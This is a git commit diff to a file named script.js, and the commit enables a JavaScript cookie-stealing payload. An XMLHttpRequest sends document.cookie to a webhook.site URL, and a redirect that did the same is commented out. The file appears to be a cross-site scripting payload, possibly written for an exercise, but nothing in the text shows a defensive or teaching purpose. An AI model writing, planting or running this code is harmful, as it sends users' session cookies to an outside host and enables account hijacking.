e785106642f6cf83d1a7d5f3cf88e72245b0c145
Afonso Pires <107490044+afonsopires1@users.noreply.github.com>
2024-12-05 16:44:55 +0000

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,5 @@
-//var xhr = new XMLHttpRequest();
-//xhr.open("GET", "https://webhook.site/09fa1e31-372e-42a4-97c6-f6856c502ea4/?cookie=" + document.cookie, true);
-//xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "https://webhook.site/09fa1e31-372e-42a4-97c6-f6856c502ea4/?cookie=" + document.cookie, true);
+xhr.send();
 
-window.location="https://webhook.site/09fa1e31-372e-42a4-97c6-f6856c502ea4/?cookie="+document.cookie;
+//window.location="https://webhook.site/09fa1e31-372e-42a4-97c6-f6856c502ea4/?cookie="+document.cookie;
